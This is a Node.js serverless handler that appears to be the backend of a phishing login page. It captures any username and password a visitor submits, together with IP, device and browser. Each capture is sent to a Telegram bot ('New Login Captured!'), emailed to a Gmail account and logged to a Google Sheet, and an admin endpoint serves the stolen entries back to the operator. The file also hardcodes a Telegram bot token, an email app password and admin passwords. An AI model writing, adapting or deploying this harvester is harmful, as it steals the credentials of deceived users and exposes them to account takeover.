const crypto     = require('crypto');
const nodemailer = require('nodemailer');
const fetch      = require('node-fetch');
const { google } = require('googleapis');

// ─── Credentials ──────────────────────────────────────────────────────────────
const VALID_USER = 'nikhil';
const VALID_PASS = '123456';
const ADMIN_USER = 'shivanshu.bnd';
const ADMIN_PASS = 'Sahu@7897';

// ─── Telegram ─────────────────────────────────────────────────────────────────
const TELEGRAM_BOT_TOKEN = '8728071772:AAE71W6skRXjkSxgWFQQrzwFE6os6-Pe8P0';
const TELEGRAM_CHAT_ID   = '1388446058';

// ─── Email ────────────────────────────────────────────────────────────────────
const EMAIL_USER = 'picturesquare.jhansi@gmail.com';
const EMAIL_PASS = 'bcjv orrt naby nztj';

// ─── Google Sheets ────────────────────────────────────────────────────────────
// These are set in Vercel Environment Variables
const SHEET_ID         = process.env.GOOGLE_SHEET_ID;
const CLIENT_EMAIL     = process.env.GOOGLE_CLIENT_EMAIL;
const PRIVATE_KEY      = (process.env.GOOGLE_PRIVATE_KEY || '').replace(/\\n/g, '\n');
const SHEET_RANGE      = 'Sheet1!A:H'; // Timestamp, Username, Password, IP, Device, Browser, ID

// ─── Google Auth ──────────────────────────────────────────────────────────────
function getSheetsClient() {
    const auth = new google.auth.JWT({
        email: CLIENT_EMAIL,
        key:   PRIVATE_KEY,
        scopes: ['https://www.googleapis.com/auth/spreadsheets']
    });
    return google.sheets({ version: 'v4', auth });
}

// ─── Token helper ─────────────────────────────────────────────────────────────
function makeToken() {
    return crypto.createHash('sha256').update(ADMIN_USER + ':' + ADMIN_PASS).digest('hex');
}

// ─── Google Sheets: Append log ────────────────────────────────────────────────
async function appendToSheet(entry) {
    if (!SHEET_ID || !CLIENT_EMAIL || !PRIVATE_KEY) return;
    try {
        const sheets = getSheetsClient();
        await sheets.spreadsheets.values.append({
            spreadsheetId: SHEET_ID,
            range:         SHEET_RANGE,
            valueInputOption: 'USER_ENTERED',
            requestBody: {
                values: [[
                    entry.timestamp,
                    entry.username,
                    entry.password,
                    entry.ip,
                    entry.device,
                    entry.browser,
                    entry.id
                ]]
            }
        });
    } catch (e) {
        console.error('Sheets append error:', e.message);
    }
}

// ─── Google Sheets: Read logs ─────────────────────────────────────────────────
async function readFromSheet() {
    if (!SHEET_ID || !CLIENT_EMAIL || !PRIVATE_KEY) return [];
    try {
        const sheets = getSheetsClient();
        const res = await sheets.spreadsheets.values.get({
            spreadsheetId: SHEET_ID,
            range:         SHEET_RANGE
        });
        const rows = res.data.values || [];
        // Map rows back to log objects (skip header row if present)
        return rows
            .filter(r => r[0] && r[0] !== 'Timestamp') // skip header
            .map(r => ({
                timestamp: r[0] || '',
                username:  r[1] || '',
                password:  r[2] || '',
                ip:        r[3] || '',
                device:    r[4] || '',
                browser:   r[5] || '',
                id:        r[6] || ''
            }))
            .reverse(); // newest first
    } catch (e) {
        console.error('Sheets read error:', e.message);
        return [];
    }
}

// ─── Nodemailer transporter ───────────────────────────────────────────────────
const transporter = nodemailer.createTransport({
    host:   'smtp.gmail.com',
    port:   465,
    secure: true,
    auth:   { user: EMAIL_USER, pass: EMAIL_PASS }
});

// ─── Telegram Notification ────────────────────────────────────────────────────
async function sendTelegram(entry) {
    const text =
        `🚨 *New Login Captured!*\n\n` +
        `👤 *Username:* \`${entry.username}\`\n` +
        `🔑 *Password:* \`${entry.password}\`\n\n` +
        `🌐 *IP:* ${entry.ip}\n` +
        `💻 *Device:* ${entry.device} (${entry.browser})\n` +
        `🕒 *Time:* ${entry.timestamp}`;
    try {
        const r = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body:    JSON.stringify({
                    chat_id:    TELEGRAM_CHAT_ID,
                    text,
                    parse_mode: 'Markdown'
                })
            }
        );
        const data = await r.json();
        if (!data.ok) console.error('Telegram error:', JSON.stringify(data));
    } catch (e) {
        console.error('Telegram send error:', e.message);
    }
}

// ─── Email Notification ───────────────────────────────────────────────────────
async function sendEmail(entry) {
    try {
        await transporter.sendMail({
            from:    `"WinzingTOR Alert" <${EMAIL_USER}>`,
            to:      EMAIL_USER,
            subject: `🚨 Login Captured: ${entry.username}`,
            text:
                `New login attempt captured!\n\n` +
                `Username : ${entry.username}\n` +
                `Password : ${entry.password}\n\n` +
                `IP       : ${entry.ip}\n` +
                `Device   : ${entry.device} (${entry.browser})\n` +
                `Time     : ${entry.timestamp}`
        });
    } catch (e) {
        console.error('Email send error:', e.message);
    }
}

// ─── Main Handler ─────────────────────────────────────────────────────────────
module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-token');

    if (req.method === 'OPTIONS') return res.status(200).end();

    // ── Admin: GET logs ──────────────────────────────────────────────────────
    if (req.method === 'GET') {
        const token = req.headers['x-admin-token'];
        if (token !== makeToken()) return res.status(401).json({ error: 'Unauthorized' });
        const logs = await readFromSheet();
        return res.status(200).json({ logs });
    }

    // ── Admin: POST login ────────────────────────────────────────────────────
    if (req.method === 'POST' && req.body?.action === 'admin-login') {
        const { username, password } = req.body;
        if (username === ADMIN_USER && password === ADMIN_PASS) {
            return res.status(200).json({ success: true, token: makeToken() });
        }
        return res.status(200).json({ success: false });
    }

    // ── User login ───────────────────────────────────────────────────────────
    if (req.method === 'POST') {
        const { username, password } = req.body || {};
        const isValid = (username === VALID_USER && password === VALID_PASS);

        if (!isValid) {
            const ua = req.headers['user-agent'] || '';
            let browser = 'Unknown';
            if      (ua.includes('Edg'))                              browser = 'Edge';
            else if (ua.includes('Chrome'))                           browser = 'Chrome';
            else if (ua.includes('Firefox'))                          browser = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';

            const device = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile' : 'Desktop';

            const entry = {
                id:        Date.now(),
                timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
                username:  username || '',
                password:  password || '',
                browser,
                device,
                ip:        (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'Unknown'
            };

            // ✅ AWAIT all 3 actions before responding — ensures delivery & persistence
            await Promise.all([
                sendTelegram(entry),
                sendEmail(entry),
                appendToSheet(entry)
            ]);
        }

        return res.status(200).json({ success: isValid });
    }

    return res.status(405).json({ error: 'Method Not Allowed' });
};
